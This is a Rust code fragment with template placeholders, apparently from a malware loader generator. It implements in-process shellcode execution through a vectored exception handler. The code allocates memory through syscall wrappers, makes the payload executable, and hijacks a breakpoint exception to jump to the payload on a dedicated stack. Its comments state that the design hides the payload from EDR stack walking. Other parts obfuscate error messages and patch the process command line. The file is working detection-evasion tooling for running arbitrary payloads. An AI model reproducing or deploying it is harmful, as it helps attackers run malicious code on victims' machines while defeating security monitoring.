// --- Vectored-exception execution (technique fragment) ---
//
// This file is injected verbatim into the generated stub's `mod step_<index>`
// when the technique is selected, so it is self-contained: its own `use`
// statements, types and helpers, all resolved inside that module.
//
// The payload runs from a private RX region on a dedicated stack. A vectored
// exception handler turns a breakpoint raised by the loader's own thread into a
// jump to the payload; a small assembly trampoline returns to the trigger, which
// restores the callee-saved registers and returns to Rust. No thread is created
// for the payload.
//
// Two ABI boundaries are explicit:
//
//   - the trigger is a `global_asm!` function with the ordinary C call/return
//     contract, so the compiler still sees a normal call;
//   - the payload is entered as `extern "system" fn() -> u32`, the same shape
//     `fibers` and `reflective_loading` give shellcode.
//
// The payload runs with its own stack, so a hook or an EDR that walks the stack
// during execution sees the payload, not a deep exception-dispatch frame.

use core::arch::global_asm;
use core::ffi::c_void;
use core::ptr;
use core::sync::atomic::{AtomicU32, AtomicUsize, Ordering};

use windows::Win32::Foundation::EXCEPTION_BREAKPOINT;
use windows::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, RemoveVectoredExceptionHandler, EXCEPTION_CONTINUE_EXECUTION,
    EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows::Win32::System::Threading::GetCurrentProcess;

/// Dedicated stack for the payload: enough for ordinary shellcode and the
/// Win32 calls it may make. It is leaked on purpose (the payload may keep
/// running after its entry point returns).
const STACK_BYTES: usize = 64 * 1024;

/// Address of the payload's entry point (published to the handler).
static ENTRY: AtomicUsize = AtomicUsize::new(0);
/// Top of the dedicated stack (published to the handler).
static STACK_TOP: AtomicUsize = AtomicUsize::new(0);
/// The loader's stack pointer at the `int3`, restored by the trampoline.
static SAVED_RSP: AtomicUsize = AtomicUsize::new(0);
/// The instruction after `int3`, where the trigger resumes.
static RESUME: AtomicUsize = AtomicUsize::new(0);
/// The payload's exit code, captured by the assembly trampoline.
static RESULT: AtomicU32 = AtomicU32::new(0);
/// Set to 1 by the trampoline: proves the handler actually entered the payload.
static RAN: AtomicU32 = AtomicU32::new(0);
/// One-shot gate: only the trigger's own breakpoint may be redirected.
static ARMED: AtomicU32 = AtomicU32::new(0);
/// Address of the trigger's `int3`, published for the handler. A breakpoint
/// exception reports the faulting instruction, not the function entry, so this
/// has to be the `int3` label, not the trigger symbol.
static TRIGGER: AtomicUsize = AtomicUsize::new(0);

// Payload return trampoline.
//
// The handler installs it as the payload's return address, so the payload's
// `ret` lands here with the exit code in `eax` and the dedicated stack still
// current. It records the code, switches back to the loader's stack and jumps
// to the instruction after `int3`; the trigger then restores the callee-saved
// registers and returns to Rust.
global_asm!(
    ".intel_syntax noprefix",
    ".global $RETURN_SYMBOL$",
    "$RETURN_SYMBOL$:",
    "mov dword ptr [rip + {result}], eax",
    "mov dword ptr [rip + {ran}], 1",
    "mov rsp, qword ptr [rip + {saved}]",
    "jmp qword ptr [rip + {resume}]",
    result = sym RESULT,
    ran = sym RAN,
    saved = sym SAVED_RSP,
    resume = sym RESUME,
);

// Breakpoint trigger.
//
// It preserves every callee-saved register around the `int3`, so the payload is
// free to clobber them: the handler switches to the dedicated stack and the
// trampoline returns here, and these `pop`s put the loader's values back.
global_asm!(
    ".intel_syntax noprefix",
    ".global $TRIGGER_SYMBOL$",
    "$TRIGGER_SYMBOL$:",
    "push rbx",
    "push rbp",
    "push rsi",
    "push rdi",
    "push r12",
    "push r13",
    "push r14",
    "push r15",
    ".global $TRIGGER_SYMBOL$_int3",
    "$TRIGGER_SYMBOL$_int3:",
    "int3",
    "pop r15",
    "pop r14",
    "pop r13",
    "pop r12",
    "pop rdi",
    "pop rsi",
    "pop rbp",
    "pop rbx",
    "ret",
);

extern "C" {
    fn $RETURN_SYMBOL$();
    fn $TRIGGER_SYMBOL$();
    fn $TRIGGER_SYMBOL$_int3();
}

/// The vectored handler: redirects the trigger's breakpoint to the payload.
///
/// It only answers the `int3` that the armed trigger raises. The handler
/// emulates a call on the dedicated stack (a return address to the trampoline at
/// `[Rsp]`) so the payload enters with the Windows x64 stack shape, and returns
/// `EXCEPTION_CONTINUE_EXECUTION`.
unsafe extern "system" fn veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    if info.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    let info = &*info;
    if info.ExceptionRecord.is_null() || info.ContextRecord.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    if (*info.ExceptionRecord).ExceptionCode != EXCEPTION_BREAKPOINT {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    // Another thread's `int3` inside the armed window is not the trigger. Leave
    // `ARMED` set so the real trigger's breakpoint is still redirected.
    let trigger = TRIGGER.load(Ordering::SeqCst);
    if trigger == 0 || (*info.ExceptionRecord).ExceptionAddress as usize != trigger {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    if ARMED.swap(0, Ordering::SeqCst) == 0 {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let entry = ENTRY.load(Ordering::SeqCst);
    let top = STACK_TOP.load(Ordering::SeqCst);
    if entry == 0 || top == 0 {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context = &mut *info.ContextRecord;
    // A call entry on x64 has Rsp % 16 == 8 and 32 bytes of shadow space above
    // the return address; leave room for both at the top of the dedicated stack.
    let new_rsp = (top & !0xF).wrapping_sub(0x38);
    let trampoline = $RETURN_SYMBOL$ as unsafe extern "C" fn();
    *(new_rsp as *mut usize) = trampoline as usize;

    SAVED_RSP.store(context.Rsp as usize, Ordering::SeqCst);
    // A breakpoint's context points at the `int3` itself (unlike a single-step
    // trap); the trigger's `int3` is one byte, so the resume address is +1.
    RESUME.store(context.Rip.wrapping_add(1) as usize, Ordering::SeqCst);
    context.Rsp = new_rsp as u64;
    context.Rip = entry as u64;
    EXCEPTION_CONTINUE_EXECUTION
}

/// Runs the payload with its own stack through a vectored exception handler.
fn run_via_veh(image: &[u8]) -> Result<i32, String> {
    // SAFETY: the function drives the system's exception dispatch and the
    // syscall layer's nt_* helpers. The handler only redirects the breakpoint
    // this function raises, and every address it publishes points at memory
    // allocated here.
    unsafe {
        let process = GetCurrentProcess();

        let mut base: *mut c_void = ptr::null_mut();
        let mut region = image.len();
        let status = crate::nt_alloc_vm(
            process,
            &mut base,
            0,
            &mut region,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            return Err(with_status($MSG_ALLOC_FAILED$, status));
        }
        ptr::copy_nonoverlapping(image.as_ptr(), base as *mut u8, image.len());

        let mut stack: *mut c_void = ptr::null_mut();
        let mut stack_size = STACK_BYTES;
        let status = crate::nt_alloc_vm(
            process,
            &mut stack,
            0,
            &mut stack_size,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            return Err(with_status($MSG_STACK_FAILED$, status));
        }

        let mut old_protect = 0u32;
        let status = crate::nt_protect_vm(
            process,
            base,
            region,
            PAGE_EXECUTE_READ.0,
            &mut old_protect,
        );
        if status < 0 {
            return Err(with_status($MSG_PROTECT_FAILED$, status));
        }

        ENTRY.store(base as usize, Ordering::SeqCst);
        STACK_TOP.store((stack as usize).wrapping_add(stack_size), Ordering::SeqCst);
        RESULT.store(0, Ordering::SeqCst);
        RAN.store(0, Ordering::SeqCst);

        let handler = AddVectoredExceptionHandler(1, Some(veh_handler));
        if handler.is_null() {
            return Err($MSG_HANDLER_FAILED$);
        }
        crate::tech_dbg!("veh_execution", "handler registered at {handler:p}");

        let trigger_int3 = $TRIGGER_SYMBOL$_int3 as unsafe extern "C" fn();
        TRIGGER.store(trigger_int3 as usize, Ordering::SeqCst);
        ARMED.store(1, Ordering::SeqCst);
        $TRIGGER_SYMBOL$();
        crate::tech_dbg!(
            "veh_execution",
            "trigger returned: ran={}, result={}",
            RAN.load(Ordering::SeqCst),
            RESULT.load(Ordering::SeqCst)
        );
        ARMED.store(0, Ordering::SeqCst);
        RemoveVectoredExceptionHandler(handler);

        if RAN.load(Ordering::SeqCst) == 0 {
            return Err($MSG_NEVER_RAN$);
        }
        let code = RESULT.load(Ordering::SeqCst);
        crate::tech_dbg!("veh_execution", "the payload returned {code}");
        Ok(code as i32)
    }
}

/// Appends a failed `nt_*` call's NTSTATUS to an obfuscated message.
fn with_status(message: String, status: i32) -> String {
    format!("{message} (status 0x{:08x})", status as u32)
}

/// Adapter expected by the stub skeleton (`payload()` calls this with the
/// decrypted payload).
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    if !$SUPPORTED_FORMAT$ {
        return Err($MSG_UNSUPPORTED_FORMAT$);
    }
    if image.is_empty() {
        return Err($MSG_EMPTY$);
    }
    // The payload runs in *this* process, so it inherits the loader's command
    // line: point the PEB at the configured `build.payloads.<name>.args` first,
    // exactly like the other in-process runners.
    crate::patch_command_line()?;
    run_via_veh(image)
}
